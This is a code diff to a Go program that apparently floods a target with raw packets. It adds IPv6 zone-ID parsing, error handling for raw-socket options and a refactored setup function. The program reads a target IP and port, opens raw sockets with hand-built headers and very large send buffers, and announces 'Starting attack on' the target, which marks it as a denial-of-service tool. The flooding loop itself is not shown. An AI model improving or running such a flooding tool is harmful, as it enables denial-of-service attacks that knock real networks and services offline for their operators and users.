@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/signal"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -43,13 +44,31 @@ func getInterface() string {
 	return "eth0"
 }
 
-func setupRaw(targetIP string, targetPort int) {
-	var err error
-	ip := net.ParseIP(targetIP)
+func parseTarget(input string) (net.IP, uint32, error) {
+	ipPart, zone, hasZone := strings.Cut(input, "%")
+	ip := net.ParseIP(ipPart)
 	if ip == nil {
-		log.Fatalf("invalid target IP: %s", targetIP)
+		return nil, 0, fmt.Errorf("invalid target IP: %s", input)
 	}
-	isIPv6 = ip.To4() == nil
+	if !hasZone || zone == "" {
+		return ip, 0, nil
+	}
+	if ip.To4() != nil {
+		return nil, 0, fmt.Errorf("IPv4 addresses do not support zones: %s", input)
+	}
+	if index, err := strconv.Atoi(zone); err == nil {
+		return ip, uint32(index), nil
+	}
+	iface, err := net.InterfaceByName(zone)
+	if err != nil {
+		return nil, 0, fmt.Errorf("invalid zone %q: %w", zone, err)
+	}
+	return ip, uint32(iface.Index), nil
+}
+
+func setupRaw(targetIP net.IP, zoneID uint32, targetPort int) {
+	var err error
+	isIPv6 = targetIP.To4() == nil
 	if isIPv6 {
 		fd, err = syscall.Socket(syscall.AF_INET6, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	} else {
@@ -59,22 +78,33 @@ func setupRaw(targetIP string, targetPort int) {
 		log.Fatal(err)
 	}
 	iface = getInterface()
-	syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, iface)
-	if isIPv6 {
-		syscall.SetsockoptInt(fd, syscall.IPPROTO_IPV6, syscall.IPV6_HDRINCL, 1)
-	} else {
-		syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+	if err := syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, iface); err != nil {
+		log.Fatal(err)
 	}
-	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 134217728)
-	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 134217728)
 	if isIPv6 {
-		target := ip.To16()
+		if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IPV6, syscall.IPV6_HDRINCL, 1); err != nil {
+			log.Fatal(err)
+		}
+	} else {
+		if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
+			log.Fatal(err)
+		}
+	}
+	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 134217728); err != nil {
+		log.Fatal(err)
+	}
+	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 134217728); err != nil {
+		log.Fatal(err)
+	}
+	if isIPv6 {
+		target := targetIP.To16()
 		var addr6 syscall.SockaddrInet6
 		copy(addr6.Addr[:], target)
 		addr6.Port = targetPort
+		addr6.ZoneId = zoneID
 		addr = &addr6
 	} else {
-		target := ip.To4()
+		target := targetIP.To4()
 		var addr4 syscall.SockaddrInet4
 		copy(addr4.Addr[:], target)
 		addr4.Port = targetPort
@@ -200,12 +230,12 @@ func main() {
 	var targetPort int
 	fmt.Scanf("%d", &targetPort)
 	fmt.Printf("Starting attack on %s:%d...\n", targetIP, targetPort)
-	setupRaw(targetIP, targetPort)
-	defer syscall.Close(fd)
-	parsedTarget := net.ParseIP(targetIP)
-	if parsedTarget == nil {
-		log.Fatalf("invalid target IP: %s", targetIP)
+	parsedTarget, zoneID, err := parseTarget(targetIP)
+	if err != nil {
+		log.Fatal(err)
 	}
+	setupRaw(parsedTarget, zoneID, targetPort)
+	defer syscall.Close(fd)
 	if isIPv6 {
 		parsedTarget = parsedTarget.To16()
 	} else {
